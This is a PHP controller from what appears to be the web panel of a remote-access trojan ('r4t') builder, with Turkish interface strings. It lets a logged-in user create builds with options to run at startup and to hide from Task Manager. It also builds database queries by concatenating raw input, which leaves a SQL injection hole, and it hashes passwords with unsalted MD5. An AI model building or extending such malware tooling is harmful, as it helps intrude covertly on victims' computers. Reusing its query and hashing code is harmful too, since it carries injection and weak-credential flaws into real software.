<?php

class R4tController extends ControllerBase
{
    public function initialize()
    {
        parent::initialize();
        $this->tag->setTitle($this->lang->_('index_title'));
    }

    public function indexAction()
    {
    $auth = $this->session->get('auth');
    $r4ts=new R4t();
    $r4ts=$r4ts->find('userid='.$auth['id']);
    $this->view->setvar('r4ts',$r4ts);
    }
    
    public function idAction($id){
    $auth = $this->session->get('auth');
    $r4t=new R4t();
    $r4t=$r4t->findfirst('id='.$id);
    if($auth['id']==$r4t->userid){
    $this->view->setvar('r4t',$r4t);
    $metadata = $r4t->getModelsMetaData();
    $attributes = $metadata->getAttributes($r4t);
    $this->view->setvar('attrs',$attributes);
    }
    }
    
    public function olusturAction(){
        if ($this->request->isPost()) {
            $name = $this->request->getPost('name', array('string', 'striptags'));
            $password = $this->request->getPost('passwd');
            $auth = $this->session->get('auth');
            if($this->request->getPost('startup')==NULL){
            $startup=0;
            }else{
            $startup = $this->request->getPost('startup');
            }
            if($this->request->getPost('hidetaskman')==NULL){
            $hidetaskman=0;
            }else{
            $hidetaskman = $this->request->getPost('hidetaskman');
            }
            $r4t = new R4t();
            $r4t->name = $name;
            $r4t->passwd = md5($password);
            $r4t->userid = $auth['id'];
            $r4t->startup = $startup;
            $r4t->hidetaskman = $hidetaskman;
            if ($r4t->save() == false) {
                foreach ($r4t->getMessages() as $message) {
                    $this->flash->error((string) $message);
                }
            } else {
                $this->flash->success('r4t oluşturuldu.');

                return $this->dispatcher->forward(
                    [
                        "controller" => "r4t",
                        "action"     => "index",
                    ]
                );
            }
        }
        $this->view->form = new R4tForm(null, array('edit' => true));
    
    }
}
